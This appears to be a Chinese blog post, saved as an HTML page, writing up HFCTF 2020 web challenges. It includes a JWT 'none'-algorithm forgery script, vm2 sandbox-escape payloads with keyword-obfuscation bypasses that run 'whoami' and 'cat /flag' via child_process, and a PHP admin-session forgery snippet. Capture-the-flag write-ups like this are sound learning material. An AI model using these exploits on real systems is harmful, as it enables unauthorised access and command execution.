@@ -1,0 +1,613 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>虎符CTF - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="虎符CTF">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-04-24 21:03" pubdate>
+        2020年4月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      967 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">虎符CTF</h1>
+            
+            <div class="markdown-body">
+              <h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><ol>
+<li><p>koa-static 源码泄露</p>
+<p>配置错了，所有的源码可以通过路由访问到</p>
+<p>主要的逻辑源码在/controllers/api.js</p>
+<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)
+<span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)
+
+<span class="hljs-keyword">const</span> APIError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;
+
+<span class="hljs-built_in">module</span>.exports = &#123;
+    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;
+        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;
+
+        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);
+        &#125;
+
+        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;
+            <span class="hljs-built_in">global</span>.secrets = [];
+        &#125;
+
+        <span class="hljs-keyword">const</span> secret = crypto.randomBytes(<span class="hljs-number">18</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);
+        <span class="hljs-keyword">const</span> secretid = <span class="hljs-built_in">global</span>.secrets.length;
+        <span class="hljs-built_in">global</span>.secrets.push(secret)
+
+        <span class="hljs-keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);
+
+        ctx.rest(&#123;
+            token: token
+        &#125;);
+
+        <span class="hljs-keyword">await</span> next();
+    &#125;,
+
+    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;
+        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;
+
+        <span class="hljs-keyword">if</span>(!username || !password) &#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);
+        &#125;
+
+        <span class="hljs-keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
+
+        <span class="hljs-keyword">const</span> sid = <span class="hljs-built_in">JSON</span>.parse(Buffer.from(token.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).toString()).secretid;
+
+        <span class="hljs-built_in">console</span>.log(sid)
+
+        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);
+        &#125;
+
+        <span class="hljs-keyword">const</span> secret = <span class="hljs-built_in">global</span>.secrets[sid];
+
+        <span class="hljs-keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);
+
+        <span class="hljs-keyword">const</span> status = username === user.username &amp;&amp; password === user.password;
+
+        <span class="hljs-keyword">if</span>(status) &#123;
+            ctx.session.username = username;
+        &#125;
+
+        ctx.rest(&#123;
+            status
+        &#125;);
+
+        <span class="hljs-keyword">await</span> next();
+    &#125;,
+
+    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;
+        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);
+        &#125;
+
+        <span class="hljs-keyword">const</span> flag = fs.readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>).toString();
+        ctx.rest(&#123;
+            flag
+        &#125;);
+
+        <span class="hljs-keyword">await</span> next();
+    &#125;,
+
+    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;
+        ctx.session.username = <span class="hljs-literal">null</span>;
+        ctx.rest(&#123;
+            status: <span class="hljs-literal">true</span>
+        &#125;)
+        <span class="hljs-keyword">await</span> next();
+    &#125;
+&#125;;</code></pre>
+</li>
+<li><p>审计一下，如果不是很清楚就抓包走一下整个过程</p>
+<p>登录的包</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /api/login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: <span class="hljs-number">5</span>ddeef<span class="hljs-number">75</span>-<span class="hljs-number">8</span>ef<span class="hljs-number">2</span>-<span class="hljs-number">4</span>f<span class="hljs-number">5</span>c-aa<span class="hljs-number">17</span>-<span class="hljs-number">0</span>e<span class="hljs-number">0</span>a<span class="hljs-number">25</span>b<span class="hljs-number">5709</span>d.node<span class="hljs-number">3</span>.buuoj.cn
+
+<span class="hljs-attribute">username</span>=<span class="hljs-number">123</span>&amp;password=<span class="hljs-number">123</span>&amp;authorization=eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJzZWNyZXRpZCI<span class="hljs-number">6</span>MCwidXNlcm<span class="hljs-number">5</span>hbWUiOiIxMjMiLCJwYXNzd<span class="hljs-number">29</span>yZCI<span class="hljs-number">6</span>IjEyMyIsImlhdCI<span class="hljs-number">6</span>MTU<span class="hljs-number">4</span>NzczNTQwNn<span class="hljs-number">0</span>.<span class="hljs-number">230</span>GGloUH<span class="hljs-number">8</span>-<span class="hljs-number">4</span>DVwdSrNa<span class="hljs-number">6</span>iL<span class="hljs-number">0</span>_hCobyexp-UIpv<span class="hljs-number">43</span>O<span class="hljs-number">6</span>A</code></pre>
+
+<p>注册了一个123/123，登录的时候还传进了一个authorization，目测是jwt 放网站解一解</p>
+<p><img src="https://s1.ax1x.com/2020/04/24/Jr955D.png" srcset="/img/loading.gif" alt="Jr955D.png"></p>
+<p>再看看代码，jwt实锤，serect不知道怎么办，哪👴直接给他置为空，说干就干</p>
+</li>
+<li><p>UB👴哪抄来的代码</p>
+<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> jwt=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);
+<span class="hljs-keyword">const</span> secretid=[];
+a=[]
+<span class="hljs-keyword">const</span> secret=secretid[a];
+<span class="hljs-keyword">const</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>;
+<span class="hljs-keyword">const</span> password=<span class="hljs-string">&#x27;123456&#x27;</span>;
+<span class="hljs-built_in">console</span>.log(jwt.sign(&#123;secretid,username,password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;none&#x27;</span>&#125;));
+
+#结果
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU4NzczNjA3OX0.</code></pre>
+
+<p>当然也可以直接构造，base64完事，接下来登录就getflag抓个包就有flag</p>
+</li>
+</ol>
+<p>后面从官方wp上看到 secretid为小数也可绕过，主要考点是jsonwebtoken 库的已知缺陷：当 jwt secret 为空时，jsonwebtoken 会采用 algorithm none 进行解密</p>
+<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><ol>
+<li>这啥啊，👴做不来，去他🐎的nodejs，应该是代码执行吧，看WP去</li>
+</ol>
+<p>​    vm.js的沙箱逃逸和绕waf  逃逸在这<a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
+<ol start="2">
+<li><p>绕waf</p>
+<pre><code class="hljs prolog"># github上给的攻击代码
+(function()&#123;
+	<span class="hljs-symbol">TypeError</span>.prototype.get_process = f=&gt;f.constructor(<span class="hljs-string">&quot;return process&quot;</span>)();
+	try&#123;
+		<span class="hljs-symbol">Object</span>.preventExtensions(<span class="hljs-symbol">Buffer</span>.from(<span class="hljs-string">&quot;&quot;</span>)).a = <span class="hljs-number">1</span>;
+	&#125;catch(e)&#123;
+		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;whoami&quot;</span>).toString();
+	&#125;
+&#125;)()
+
+
+过滤了一些关键字，赵师傅的wp得知可以通过 <span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`prototyp`</span>&#125;e<span class="hljs-string">`&#125;`</span> 拼接关键字
+
+(function ()&#123;
+    <span class="hljs-symbol">TypeError</span>[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`prototyp`</span>&#125;e<span class="hljs-string">`&#125;`</span>][<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`get_proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>] = f=&gt;f[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`constructo`</span>&#125;r<span class="hljs-string">`&#125;`</span>](<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`return this.proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>)();
+    try&#123;
+        <span class="hljs-symbol">Object</span>.preventExtensions(<span class="hljs-symbol">Buffer</span>.from(<span class="hljs-string">``</span>)).a = <span class="hljs-number">1</span>;
+    &#125;catch(e)&#123;
+        return e[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`get_proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>](()=&gt;&#123;&#125;).mainModule[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`requir`</span>&#125;e<span class="hljs-string">`&#125;`</span>](<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`child_proces`</span>&#125;s<span class="hljs-string">`&#125;`</span>)[<span class="hljs-string">`$&#123;`</span>$&#123;<span class="hljs-string">`exe`</span>&#125;cSync<span class="hljs-string">`&#125;`</span>](<span class="hljs-string">`whoami`</span>).toString();
+    &#125;
+&#125;)()
+
+官方<span class="hljs-symbol">WP</span>上的payload
+
+(()=&gt;&#123; <span class="hljs-symbol">TypeError</span>[[<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`y`</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`e`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)][<span class="hljs-string">`a`</span>] = f=&gt;f[[<span class="hljs-string">`c`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`r`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)]([<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`t`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">` `</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`s`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>))(); try&#123; <span class="hljs-symbol">Object</span>[<span class="hljs-string">`preventExtensions`</span>](<span class="hljs-symbol">Buffer</span>[<span class="hljs-string">`from`</span>](<span class="hljs-string">``</span>))[<span class="hljs-string">`a`</span>] = <span class="hljs-number">1</span>; &#125;catch(e)&#123; return e[<span class="hljs-string">`a`</span>](()=&gt;&#123;&#125;)[<span class="hljs-string">`mainModule`</span>][[<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`q`</span>,<span class="hljs-string">`u`</span>,<span class="hljs-string">`i`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`e`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)]([<span class="hljs-string">`c`</span>,<span class="hljs-string">`h`</span>,<span class="hljs-string">`i`</span>,<span class="hljs-string">`l`</span>,<span class="hljs-string">`d`</span>,<span class="hljs-string">`_`</span>,<span class="hljs-string">`p`</span>,<span class="hljs-string">`r`</span>,<span class="hljs-string">`o`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`s`</span>,<span class="hljs-string">`s`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>))[[<span class="hljs-string">`e`</span>,<span class="hljs-string">`x`</span>,<span class="hljs-string">`e`</span>,<span class="hljs-string">`c`</span>,<span class="hljs-string">`S`</span>,<span class="hljs-string">`y`</span>,<span class="hljs-string">`n`</span>,<span class="hljs-string">`c`</span>][<span class="hljs-string">`join`</span>](<span class="hljs-string">``</span>)](<span class="hljs-string">`cat /flag`</span>)[<span class="hljs-string">`toString`</span>](); &#125; &#125;)()</code></pre>
+
+
+
+</li>
+</ol>
+<h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>代码审计咯，就是伪造session文件  </p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_binary&#x27;</span>);
+session_save_path(<span class="hljs-string">&quot;./&quot;</span>);
+session_start();
+
+<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span>;
+
+<span class="hljs-comment">#生成一下伪造成admin，然后就直接传一个success.txt文件夹上去，登录下就可以了</span></code></pre>
+
+
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/HFCTF/">HFCTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-DASCTF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">安恒月赛 DASCTF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/04/21/NPUCTF-web-Wp/">
+                        <span class="hidden-mobile">NPUCTF web Wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
